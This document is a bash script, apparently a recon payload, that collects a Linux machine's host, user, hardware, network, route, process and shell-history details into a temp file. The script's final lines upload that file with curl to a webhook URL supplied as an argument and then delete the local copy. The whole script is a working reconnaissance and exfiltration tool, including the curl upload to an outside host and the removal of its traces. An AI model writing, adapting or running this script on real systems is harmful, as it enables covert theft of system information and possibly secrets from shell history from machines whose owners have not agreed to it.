# Usage: ./Linux_Recon.sh "webhook_url"
url=$1

# Basic system and user info
echo "Hostname: " > /tmp/Linux_Recon.txt
uname -n >> /tmp/Linux_Recon.txt
echo " " >> /tmp/Linux_Recon.txt
echo "User: " >> /tmp/Linux_Recon.txt
whoami >> /tmp/Linux_Recon.txt
uname -a >> /tmp/Linux_Recon.txt

# CPU Info
echo " " >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
echo "CPU INFO" >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
lscpu >> /tmp/Linux_Recon.txt

# Block info
echo " " >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
echo "BLOCK INFO" >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
lsblk >> /tmp/Linux_Recon.txt

# USB info
echo " " >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
echo "USB INFO" >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
lsusb >> /tmp/Linux_Recon.txt

# Network info
echo " " >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
echo "NETWORK INFO" >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
ifconfig >> /tmp/Linux_Recon.txt

# Route info
echo " " >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
echo "ROUTE INFO" >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
route -n >> /tmp/Linux_Recon.txt

# Memory info
echo " " >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
echo "MEMORY INFO" >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
free -h >> /tmp/Linux_Recon.txt

# Filesystem info
echo " " >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
echo "FILESYSTEM INFO" >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
df -h >> /tmp/Linux_Recon.txt

# Process info
echo " " >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
echo "PROCESS INFO" >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
ps -aux >> /tmp/Linux_Recon.txt

# History info
echo " " >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
echo "HISTORY INFO" >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
history >> /tmp/Linux_Recon.txt

# Hardware info
echo " " >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
echo "HARDWARE INFO" >> /tmp/Linux_Recon.txt
echo "---------------------" >> /tmp/Linux_Recon.txt
lshw -short >> /tmp/Linux_Recon.txt

curl -F "file=@/tmp/Linux_Recon.txt" $url
rm /tmp/Linux_Recon.txt
